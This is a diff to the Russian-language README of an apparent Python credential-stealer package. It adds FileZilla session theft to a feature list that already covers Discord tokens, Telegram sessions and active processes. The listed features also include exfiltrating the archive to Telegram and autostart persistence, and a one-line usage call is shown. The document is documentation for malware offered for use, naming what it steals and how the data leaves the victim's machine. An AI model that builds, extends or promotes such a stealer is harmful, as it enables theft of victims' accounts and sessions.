@@ -44,6 +44,7 @@
    - Активные процессы
    - Токены Discord
    - Сессии Telegram
+   - Сессии FileZilla
 3. Отправка архива собранных данных в Telegram.
 4. Выполнение в отдельном потоке.
 5. Возможность добавления в автозагрузку.
@@ -78,6 +79,8 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 - `discord` - сбор токенов Discord.
 
 - `telegram` – сбор сессий Telegram.
+
+- `filezilla` – сбор сессий FileZilla.
 
 Все параметры принимают значение `bool`. 
 
